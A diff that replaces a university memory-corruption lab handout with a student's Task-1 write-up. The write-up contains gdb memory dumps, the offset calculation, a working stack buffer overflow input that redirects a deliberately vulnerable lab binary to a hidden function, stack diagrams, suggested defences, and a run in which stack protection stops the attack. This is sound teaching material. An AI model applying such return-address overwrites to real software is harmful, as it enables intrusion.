@@ -1,111 +1,98 @@
-# Memory Corruption
+# Solution
 
-2026-03-24
+## Task-1
 
-## Introduction
 
-The goal of this lab is to introduce students to some important categories of software implementation bugs. In addition to recognizing these bugs, students will also learn to use several important tools during the lab, which can be used to exploit implementation flaws. Finally, students are asked to try different defenses against the attacks they have previously developed.
-
-## Theoretical Summary
-
-The theoretical parts of the material needed for the lab can be found in the Memory Corruption slides of the Software Security course. In addition to the foundations covered there, the following details may help with completing the lab.
-
-## Compilation
-
-During the lab it is often necessary to recompile the analyzed application with the appropriate flags. This can be done efficiently with make. Each task includes a makefile that contains all required configuration to make the work easier. At the start of the lab, it is recommended to review the makefile!
-
-## Efficient Parameter Passing
-
-The applications analyzed during the lab usually process command-line parameters. During an attack, it is often necessary to pass a large number of identical characters. This can be done efficiently by combining bash features with a scripting language. A simple example using Python:
-
+not_called function memory adress:
 ```bash
-./app "$(python3 -c 'print("A"*4 + "\x01\x02\x03\x04")')"
+(gdb) print not_called
+$1 = {void ()} 0x8049186 <not_called>
+(gdb) 
 ```
 
-Passing raw bytes directly in bash:
-
 ```bash
-./app $'AAAA\x01\x02\x03\x04'
+Breakpoint 1 at 0x80491ca: file main.c, line 12.
+(gdb) run AAAAAAAAAAAA
+Starting program: /home/crysys/itsec/it-security-lab/lab3-memory-corruption/task-1/app_32 AAAAAAAAAAAA
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, vulnerable_function (string=0xffffd1c9 'A' <repeats 12 times>) at main.c:12
+12          strcpy(buffer, string);
+(gdb) x/20x $esp
+0xffffcecc:     0x00000000      0x00000000      0xf7fa0e34      0xffffcee8
+0xffffcedc:     0x0804921b      0xffffd1c9      0xf7fa0e34      0x00000000
+0xffffceec:     0xf7d9cc75      0x00000002      0xffffcfa4      0xffffcfb0
+0xffffcefc:     0xffffcf10      0xf7fa0e34      0x0804909d      0x00000002
+0xffffcf0c:     0xffffcfa4      0xf7fa0e34      0xffffcfb0      0xf7ffcb60
+(gdb) 
 ```
 
-## Useful GDB Commands
+Buffer start: 
+```bash
+0xffffcecc
+```
+The return address
+```bash
+0xffffcedc
+```
 
-Using gdb is recommended when examining the applications during the lab. In addition to the more familiar instructions, the following commands may also be useful:
+the program will return here after the function
 
-- `b *<address>`: Set a breakpoint at a given address.
-- `print foo`: Print the address of the `foo` function in memory.
-- `print 'malloc@plt'`: Print the address of the `malloc` function in the PLT table.^1 Functions called from external libraries are invoked indirectly through the `.plt` table.
-- `disas`: Disassemble a given function or address.
-- `x/[num]x <address>`: Print the contents of a memory region over `num*8` bytes.
+```
+0xffffcedc - 0xffffcecc = 0x10
+```
 
-## Function Call Process
+That's 16 => if we copy 16 bytes then we overwrite everything with it and from the 17th we can write the not_called function address, but on x86 architecture the bytes are in reverse order => 
 
-During a function call, stack management is partly handled by the caller and partly by the callee.
+``` bash
+\x86\x91\x04\x08
+```
+Therefore: 
+```bash
+crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
+Enjoy your shell!
+```
 
-### The Caller’s Responsibilities
+### Stack State Analysis
 
-Before execution can jump to a function, the caller has two tasks. First, it must place the parameters required for the callee on the stack, and their order may depend on the calling convention. Second, it must place a return address. This tells the callee which address execution should continue from after it finishes.
+#### Before
 
-### The Callee’s Responsibilities
 
-The callee continues building the stack frame. After the caller’s preparation, the EBP register is saved. Finally, only the space needed for local variables has to be allocated, and then the actual function logic can begin.
+| Address | Value (Hex) | Meaning / Content |
+|---------|-------------|-------------------|
+| 0xffffcecc | 0x00000000 | buffer[0-3] start |
+| 0xffffced0 | 0x00000000 | buffer[4-7] end |
+| 0xffffced4 | 0xf7fa0e34 | Filler data / Padding |
+| 0xffffced8 | 0xffffcee8 | Saved EBP (Saved EBP register) |
+| 0xffffcedc | 0x0804921b | Original Return Address (main) |
 
-Based on this, the prepared stack looks like the following figure:
+#### After
 
-## Tasks
+| Address | Value (Hex) | Meaning / Content |
+|---------|-------------|-------------------|
+| 0xffffcecc | 0x41414141 | buffer overwritten ('AAAA') |
+| 0xffffced0 | 0x41414141 | buffer overwritten ('AAAA') |
+| 0xffffced4 | 0x41414141 | Filler data overwritten ('AAAA') |
+| 0xffffced8 | 0x41414141 | Saved EBP overwritten ('AAAA') |
+| 0xffffcedc | 0x08049186 | Modified Return Address (not_called) |
 
-### 1. Introduction to Buffer Overflow
 
-The goal of the first task is to implement a simple buffer overflow. The vulnerable application is located in the `task-1` folder. The goal of the attack is to divert execution so that the `not_called` function also runs.
+### Recomanded defense
 
-Steps:
+- Soruce Code: replece strcpy with strncpy
+- Stack Canaries Use the -fstack-protector-all compiler flag to insert a "canary" value between local variables and the return address.
 
-1. Review the makefile! Find which command will be executed when make is run.
-2. Inspect the source code and find the vulnerability in the application!
-3. Compile the application: `make`
-4. Analyze the application’s behavior at runtime using gdb!
-5. Draw the stack before the attack and immediately after it!
-6. Provide the attacker input that achieves the goal!
-7. Suggest a fix at the following levels: source code changes, compilation, operating system!
-8. Check whether compiling the application with stack smashing protection enabled (`make withSSP`) protects against the attack. Explain the result!
+### WithSSP
+crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+crysys@crysys-virtualbox:~/itsec/it-security-lab/lab3-memory-corruption/task-1$ 
 
-### 2. Buffer Overflow with Parameters
 
-This task aims to implement a buffer overflow attack extended with parameter passing. The vulnerable application is located in the `task-2` folder. The goal is to exploit the vulnerability to call the `now_called` function while placing the appropriate parameter on the stack as if a real function call were taking place.
+## Task-2
 
-Steps:
 
-1. Compile the application: `make`
-2. Analyze the application’s behavior at runtime using gdb!
-3. Draw the stack before the attack and immediately after it!
-4. Provide the attacker input that achieves the goal!
-5. Check whether compiling with ASLR enabled (`make withASLR` and `make withASLRwithPIE`) protects against the attack. Explain the result!
 
-### 3. Return to LibC
 
-The goal of the third task is to implement a Return-to-LibC attack. The vulnerable application is located in the `task-3` folder. If an application uses a library, then an attacker can jump not only to functions written by the programmers, but also to any function found in the loaded libraries.
 
-As a result, any function in a shared library can help an attacker, typically one from the LibC library. The goal of the attack is to divert execution so that the `system` function runs with the appropriate parameter.
-
-Steps:
-
-1. Compile the application: `make`
-2. Analyze the application’s behavior at runtime using gdb!
-3. Based on the LibC documentation, determine which parameter is required to achieve the goal.
-4. Draw the stack before the attack and immediately after it!
-5. Provide the attacker input that achieves the goal!
-6. Check whether compiling with NX enabled (`make withNX`) protects against the attack. Explain the result!
-
-### 4. ROP
-
-The goal of the fourth task is to implement a ROP attack. The vulnerable application is located in the `task-4` folder. In a ROP attack, small code snippets found in the binary (gadgets) are reused to build an attack. The first step is to use the ROPgadget Python script to examine which gadgets are available. It is not at all certain that the gadgets needed for the simplest imagined solution are available, so some creativity may be required. By combining them appropriately, achieve a shell again! In a ROP attack, the input can be significantly longer than in previous tasks, so using the `exploit.py` script in the folder is recommended. This script includes several hints about which gadgets may be worth searching for, and it also serves as a sample showing how to assemble the attack.
-
-Steps:
-
-1. Inspect the source code and identify the vulnerability and the possible attack in the application!
-2. Compile the application: `make`
-3. Analyze the application’s behavior at runtime using gdb!
-4. Draw the stack before the attack and immediately after it!
-5. Use ROPgadget to find the available gadgets!
-6. Use `exploit.py` to assemble the attack!
-7. Check whether compiling with stack smashing protection enabled (`make withSSP`) protects against the attack. Explain the result!
